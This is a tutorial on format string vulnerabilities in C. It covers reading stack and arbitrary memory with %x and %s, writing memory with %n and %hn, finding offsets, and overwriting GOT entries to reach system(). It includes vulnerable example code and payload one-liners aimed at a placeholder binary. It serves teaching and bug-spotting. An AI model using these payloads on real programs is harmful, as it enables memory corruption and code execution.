# Format String Attacks

A format string attack exploits `printf()` (or fprintf, sprintf, etc.) called with user-controlled input as the format string:

```c
// Vulnerable
char buf[100];
gets(buf);
printf(buf);          // user controls the format string!

// Safe
printf("%s", buf);    // format string is fixed
```

If the user types `%x %x %x`, printf treats each `%x` as "print the next value on the stack in hex". This lets you read and write arbitrary memory.

## Why does it work?

printf() uses a variable number of arguments. It reads the format string and for each `%` specifier, it pops the next value from the stack. printf has no way to know how many arguments were actually passed; it trusts the format string.

```c
printf("%s", name);          // 1 argument expected, 1 provided: safe
printf(user_input);          // 0 arguments provided, but user can request many
```

## Reading the stack

### %x: read stack values as hex

```bash
$ ./binary "AAAA %x %x %x %x"
AAAA b7ff26b0 bffff6a4 b7fd0ff4 41414141
```

Each `%x` reads 4 bytes from the stack. Eventually you see `41414141`; that's your "AAAA" (0x41 = 'A' in ASCII). This tells you where your input sits on the stack.

### Direct parameter access: %N$x

Instead of reading one by one, jump directly to the Nth parameter:

```bash
$ ./binary "AAAA %4$x"
AAAA 41414141
```

`%4$x` means "read the 4th parameter as hex". This is how you find the offset of your input on the stack.

## Reading arbitrary memory: %s

`%s` reads a string from the address on the stack:

```bash
# Place an address on the stack, then read it with %s
$ python -c "print('\x84\x97\x04\x08' + '%4\$s')" | ./binary
```

This reads the string at address 0x08049784. Useful for reading the GOT or other memory locations.

## Writing to memory: %n

`%n` writes the number of bytes printed so far to the address on the stack. This is the dangerous one.

```c
int count;
printf("hello%n", &count);   // count = 5 (5 characters printed before %n)
```

In an exploit:

```bash
# Write to address 0x08049784
$ python -c "print('\x84\x97\x04\x08' + '%4\$n')" | ./binary
```

This writes the number of characters printed so far to address 0x08049784.

### Controlling the value written

Use padding to control how many characters are "printed":

```bash
# Write the value 42 to the address
$ python -c "print('\x84\x97\x04\x08' + '%38x' + '%4\$n')" | ./binary
```

- 4 bytes (the address) + 38 bytes of padding = 42 bytes printed
- `%4$n` writes 42 to the address

### Writing large values: %hn (half-word)

`%n` writes 4 bytes, but the value is limited by how many characters you print. To write a large value like 0x08048444, you'd need to print ~134 million characters.

Instead, use `%hn` to write 2 bytes at a time:

```
Address + 0: write low 2 bytes  (0x8444)
Address + 2: write high 2 bytes (0x0804)
```

## Step by step: finding the offset

1. Send `AAAA` followed by multiple `%x`:
   ```bash
   ./binary "AAAA %x %x %x %x %x %x %x"
   ```

2. Look for `41414141` in the output; that's your AAAA

3. Count which position it appears at (e.g., 4th = offset 4)

4. Verify with direct access:
   ```bash
   ./binary "AAAA %4$x"
   ```
   Should print `41414141`.

## Common exploit patterns

### Read a value at a known address
```bash
python -c "print('\x84\x97\x04\x08' + '%4\$s')" | ./binary
```

### Overwrite GOT entry (redirect a function call)
```bash
# Overwrite puts@GOT with system() address
python -c "
import struct
got_addr = 0x08049784          # puts@GOT
system = 0xb7e6b060            # system() address

# Write low 2 bytes to got_addr, high 2 bytes to got_addr+2
payload = struct.pack('I', got_addr)
payload += struct.pack('I', got_addr + 2)
# ... add %hn writes for each half
" | ./binary
```

### Overwrite a global variable
```bash
python -c "print('\x84\x97\x04\x08' + '%42x' + '%4\$n')" | ./binary
```

## Quick reference

| Specifier | Action |
|---|---|
| `%x` | Read 4 bytes from stack as hex |
| `%N$x` | Read Nth parameter as hex |
| `%s` | Read string at address on stack |
| `%N$s` | Read string at Nth parameter (treated as address) |
| `%n` | Write number of bytes printed to address on stack (4 bytes) |
| `%N$n` | Write to Nth parameter (treated as address) |
| `%hn` | Same as %n but writes only 2 bytes (half-word) |
| `%hhn` | Same as %n but writes only 1 byte |
| `%Nx` | Print N characters of padding (to control %n value) |

## When to spot it

Look for:
- `printf(variable)`: user-controlled format string
- `fprintf(stream, variable)`: same with file stream
- `sprintf(buf, variable)`: same into a buffer
- No `"%s"` as the first argument
